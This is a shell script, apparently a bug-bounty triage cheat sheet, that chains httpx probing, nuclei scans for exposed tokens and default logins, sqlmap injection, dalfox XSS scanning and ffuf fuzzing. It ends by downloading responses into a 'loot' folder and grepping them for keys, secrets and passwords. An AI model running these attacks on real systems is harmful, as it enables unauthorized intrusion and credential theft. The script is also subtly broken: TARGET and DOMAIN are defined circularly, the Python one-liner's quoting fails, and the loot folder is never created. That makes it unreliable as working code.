# Inspect triage commands — set paths on authorized assets only
export INSPECT_FILE="/path/to/thetshas/master/inspect.txt"
export TARGET="https://$DOMAIN"
export DOMAIN="$(python3 -c \"from urllib.parse import urlparse; import os; u=os.environ.get('TARGET',''); print(urlparse(u).netloc or 'COMP_HOST')\")"
export OUT="$HOME/ops/$DOMAIN/inspect_triage"
mkdir -p "$OUT"

# Regenerate buckets with this repo:
python3 scripts/analyze_inspect_urls.py "$INSPECT_FILE" -o "$OUT"

httpx -l "$OUT/inspect_critical_api.txt" -status-code -title -tech-detect -json -o "$OUT/live_api.json"
httpx -l "$OUT/inspect_critical_auth.txt" -status-code -follow-redirects -o "$OUT/live_auth.txt"
httpx -l "$OUT/inspect_critical_fintech.txt" -status-code -title -o "$OUT/live_fintech.txt"
httpx -l "$OUT/inspect_critical_params.txt" -status-code -mc 200,301,302,403,500 | tee "$OUT/live_params.txt"

nuclei -l "$OUT/inspect_critical_api.txt" -tags exposure,api,misconfig,token -severity medium,high,critical -o "$OUT/nuclei_api.txt"
nuclei -l "$OUT/inspect_critical_auth.txt" -tags oauth,default-login,token,session -o "$OUT/nuclei_auth.txt"
nuclei -l "$OUT/inspect_critical_config.txt" -tags exposure,config,backup,debug -o "$OUT/nuclei_config.txt"

sqlmap -m "$OUT/inspect_critical_params.txt" --batch --smart --level=2 --risk=1 --random-agent --threads=2
dalfox file "$OUT/inspect_critical_params.txt" --silence -o "$OUT/dalfox_params.txt"

grep -Ei 'cdn-cgi/challenge' "$INSPECT_FILE" | sort -u > "$OUT/cloudflare_challenge_urls.txt"
ffuf -request "$OUT/encoding_probe.req" -w "$OUT/inspect_critical_encoding.txt" 2>/dev/null || ffuf -u "$TARGET/FUZZ" -w "$OUT/inspect_critical_encoding.txt" -mc 200,301,302,403,500

cat "$OUT"/inspect_critical_*.txt | sort -u > "$OUT/all_critical_merged.txt"
httpx -l "$OUT/all_critical_merged.txt" -status-code -title -tech-detect | tee "$OUT/all_critical_live.txt"

# Evidence extraction (minimal)
jq -r '.url' "$OUT/live_api.json" 2>/dev/null | while read -r u; do curl -sS -m 15 "$u" -o "$OUT/loot/$(echo "$u" | md5sum | cut -c1-16).body"; done
grep -RinE "api_key|secret|token|password" "$OUT/loot" 2>/dev/null | tee "$OUT/loot/grep_hits.txt"
